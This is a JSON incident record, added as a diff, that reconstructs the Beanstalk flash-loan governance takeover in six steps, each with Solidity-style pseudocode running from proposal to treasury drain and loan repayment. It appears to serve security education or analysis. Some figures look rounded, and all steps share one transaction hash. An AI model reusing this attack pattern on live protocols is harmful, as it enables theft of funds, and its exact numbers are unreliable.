@@ -1,0 +1,120 @@
+{
+  "title": "Flash Loan Governance Takeover (Beanstalk)",
+  "severity": "Critical",
+  "chain": "Ethereum",
+  "actors": [
+    "Attacker",
+    "FlashLender",
+    "GovernanceToken",
+    "DAO",
+    "Treasury"
+  ],
+  "incidents": [
+    {
+      "name": "Beanstalk",
+      "date": "2022-04-17",
+      "chain": "Ethereum",
+      "loss_usd": "$182M",
+      "attacker": "0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4",
+      "contract": "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5",
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "block": 14602790,
+      "etherscan": "https://etherscan.io/tx/0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915"
+    }
+  ],
+  "initial_state": {
+    "treasury_balance": "$182,000,000",
+    "governance_token": "BEAN (Beanstalk Stalk)",
+    "total_stalk_supply": "10,000,000 STALK",
+    "quorum_threshold": "50% + 1 vote",
+    "timelock_delay": "⚠️ 0 seconds (emergencyCommit enabled)",
+    "proposal_cost": "Negligible (no bond required)",
+    "flash_loan_available": "✓ Unlimited via Aave/dYdX"
+  },
+  "steps": [
+    {
+      "step": 1,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "Attacker",
+      "to": "DAO",
+      "action": "propose(BIP-18: malicious_drain_proposal)",
+      "description": "Attacker submits a malicious governance proposal (BIP-18) that, if executed, will transfer all treasury funds to the attacker's address. The proposal is disguised with an innocuous title. No bond or minimum token holding is required to submit proposals.",
+      "code": "// Attacker creates malicious proposal\nbeanstalk.propose(\n    [treasury.address],                    // targets\n    [0],                                   // values\n    [abi.encodeWithSignature(\n        \"transfer(address,uint256)\",\n        attacker,\n        treasury.balance()                  // drain everything\n    )],\n    \"BIP-18: Routine parameter adjustment\" // misleading description\n);\n// proposalId = keccak256(...)\n// ⚠️ No proposal bond, no minimum stake required",
+      "state_changes": {
+        "proposal_status": "✓ Active (BIP-18 created)",
+        "voting_period": "⚠️ Immediate execution possible with emergencyCommit",
+        "proposal_content": "⚠️ Hidden drain function"
+      }
+    },
+    {
+      "step": 2,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "Attacker",
+      "to": "FlashLender",
+      "action": "flashLoan(1B USDC + 1B DAI + 1B USDT)",
+      "description": "Attacker takes a massive flash loan from Aave — borrowing $3 billion in stablecoins across USDC, DAI, and USDT. The flash loan must be repaid within the same transaction, but gives the attacker temporary control of enormous capital.",
+      "code": "// Step 1 of attack transaction: Flash borrow\nIAaveLendingPool(aave).flashLoan(\n    address(this),\n    [USDC, DAI, USDT],\n    [1_000_000_000e6, 1_000_000_000e18, 1_000_000_000e6],\n    [0, 0, 0],        // no debt mode\n    address(this),\n    \"\",\n    0\n);\n// ⚠️ $3B borrowed with zero collateral\n// Must be repaid by end of transaction",
+      "state_changes": {
+        "attacker_balance": "💰 $3,000,000,000 (flash borrowed)",
+        "flash_loan_active": "⚠️ Must repay in same transaction"
+      }
+    },
+    {
+      "step": 3,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "Attacker",
+      "to": "GovernanceToken",
+      "action": "deposit($3B → acquire 67% voting power)",
+      "description": "Attacker deposits the flash-borrowed stablecoins into Beanstalk's Silo to receive Stalk (governance) tokens. The $3B deposit gives the attacker approximately 67% of total Stalk supply — well above the 50% quorum needed. The protocol allows immediate voting power upon deposit.",
+      "code": "// Convert flash-borrowed funds to governance power\n// Deposit stablecoins into Beanstalk Silo\nbeanstalk.deposit(USDC, 1_000_000_000e6);\nbeanstalk.deposit(DAI, 1_000_000_000e18);\nbeanstalk.deposit(USDT, 1_000_000_000e6);\n\n// Attacker now holds ~67% of all Stalk\n// Total Stalk: 10,000,000 (existing) + ~20,000,000 (new)\n// Attacker Stalk: ~20,000,000 / 30,000,000 = 66.7%\n// ⚠️ Quorum requirement: 50% → EXCEEDED",
+      "state_changes": {
+        "attacker_stalk": "⚠️ ~20,000,000 STALK (67% of supply)",
+        "quorum_reached": "⚠️ YES (67% > 50%)",
+        "voting_power": "⚠️ Attacker has supermajority"
+      }
+    },
+    {
+      "step": 4,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "Attacker",
+      "to": "DAO",
+      "action": "vote(BIP-18, FOR) + emergencyCommit(BIP-18)",
+      "description": "Attacker votes FOR their malicious proposal with 67% of the total Stalk. The Beanstalk governance allows emergencyCommit — if a proposal reaches quorum, it can be executed immediately without waiting for the timelock period. The attacker votes and executes in the same transaction.",
+      "code": "// Vote with flash-loaned governance power\nbeanstalk.vote(proposalId, true); // 67% FOR\n\n// emergencyCommit: skip timelock if quorum reached!\n// ⚠️ No timelock delay when supermajority achieved\nbeanstalk.emergencyCommit(proposalId);\n\n// Governance check:\n// votesFor: 20,000,000 (67%)\n// votesAgainst: 0\n// quorum: 50% ← PASSED\n// Result: IMMEDIATE EXECUTION",
+      "state_changes": {
+        "proposal_votes": "⚠️ 67% FOR, 0% AGAINST",
+        "proposal_status": "⚠️ PASSED + EXECUTED (no timelock)",
+        "timelock_bypassed": "⚠️ emergencyCommit used"
+      }
+    },
+    {
+      "step": 5,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "DAO",
+      "to": "Treasury",
+      "action": "execute(BIP-18) → transfer($182M to attacker)",
+      "description": "The malicious proposal executes, transferring all $182M from the Beanstalk treasury to the attacker's contract. The DAO contract calls transfer on every token in the treasury, draining BEAN, USDC, ETH, and LP tokens. This is irreversible on-chain.",
+      "code": "// BIP-18 executes the drain\n// The DAO contract calls:\nIERC20(BEAN).transfer(attacker, BEAN.balanceOf(treasury));\nIERC20(USDC).transfer(attacker, USDC.balanceOf(treasury));\nIERC20(WETH).transfer(attacker, WETH.balanceOf(treasury));\n\n// Also drains LP positions:\nICurvePool(bean3crv).remove_liquidity(lpBalance, [0,0,0,0]);\nIUniswapV2Pair(beanEthLP).transfer(attacker, lpBalance);\n\n// Total drained: $182,000,000",
+      "state_changes": {
+        "treasury_balance": "⚠️ $0 (was $182,000,000)",
+        "attacker_received": "💰 $182,000,000 in various tokens",
+        "protocol_status": "⚠️ DRAINED"
+      }
+    },
+    {
+      "step": 6,
+      "tx_hash": "0xcd314668aa124c1e457585093557e5d1e2e4e41074128a50616b3f7f18376915",
+      "from": "Attacker",
+      "to": "FlashLender",
+      "action": "withdraw() + repayFlashLoan($3B + fee)",
+      "description": "Attacker withdraws their deposited stablecoins from the Silo (burning the Stalk), repays the $3B flash loan plus the ~0.09% fee ($2.7M). Net profit: $182M stolen minus $2.7M in flash loan fees = ~$179.3M. The entire attack executes in a single atomic transaction.",
+      "code": "// Withdraw deposits from Silo\nbeanstalk.withdraw(USDC, depositedAmount);\nbeanstalk.withdraw(DAI, depositedAmount);\nbeanstalk.withdraw(USDT, depositedAmount);\n\n// Repay flash loans + 0.09% fee\nIERC20(USDC).transfer(aave, 1_000_000_000e6 + fee);\nIERC20(DAI).transfer(aave, 1_000_000_000e18 + fee);\nIERC20(USDT).transfer(aave, 1_000_000_000e6 + fee);\n// Total fee: ~$2,700,000\n\n// ✅ Transaction completes successfully\n// Entire attack in ONE transaction, ONE block",
+      "state_changes": {
+        "flash_loan_repaid": "✓ $3,000,000,000 + $2,700,000 fee",
+        "attacker_net_profit": "💰 ~$179,300,000",
+        "attack_duration": "⚠️ 1 transaction (~12 seconds)",
+        "beanstalk_status": "⚠️ Protocol effectively destroyed"
+      }
+    }
+  ]
+}
